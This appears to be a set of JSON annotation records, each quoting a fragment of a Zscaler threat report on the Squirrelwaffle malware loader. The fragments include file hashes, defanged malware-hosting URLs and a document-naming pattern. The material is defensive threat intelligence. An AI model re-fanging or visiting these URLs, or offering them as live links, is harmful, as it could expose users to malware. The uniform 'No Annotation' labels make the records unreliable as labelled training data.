{"mention": "* 5e9f33e5baa6d6efca91c8db78c01bd0", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 2156a1a8b0c579a51ea77d1bc7062b49", "sentence_right": "* fae4ca3c95a5068063637b2f2ed3a5b2", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Attack Chain", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "The Squirrelwaffle loader is being delivered from the same infrastructure that was delivering the Qakbot banking trojan.", "sentence_right": "------------", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://kmslogistik[.]com/repellat-et/est.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://inetworx.co[.]za/voluptate-sunt/est.zip", "sentence_right": "* hxxps://moeinjelveh[.]ir/et-eligendi/placeat.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 3ecc9ca5e744d7ddafa04834c70b95c3", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "### Unpacked DLL file MD5 Hash", "sentence_right": "### Domain used by the DLL for Squirrelwaffle CnC", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://cortinastelasytrazos[.]com/Yro6Atvj/sec.html", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://lotolands[.]com/JtaTAt4Ej/130921.html", "sentence_right": "* hxxps://orquideavallenata[.]com/4jmDb0s9sg/sec.html", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "These documents follow a similar naming convention matching the regular expression diagram-\\d{2,3}.doc.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Once a victim clicks on the URL, a ZIP file is downloaded that contains a Microsoft Word document.", "sentence_right": "For example, the file with an MD5 hash E599A656599A2680C9392C7329D9D519 has the filename diagram-346.doc.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "### Unpacked DLL file MD5 Hash", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* ebeeef845d0d666363935da89a57b44d", "sentence_right": "* 3ecc9ca5e744d7ddafa04834c70b95c3", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}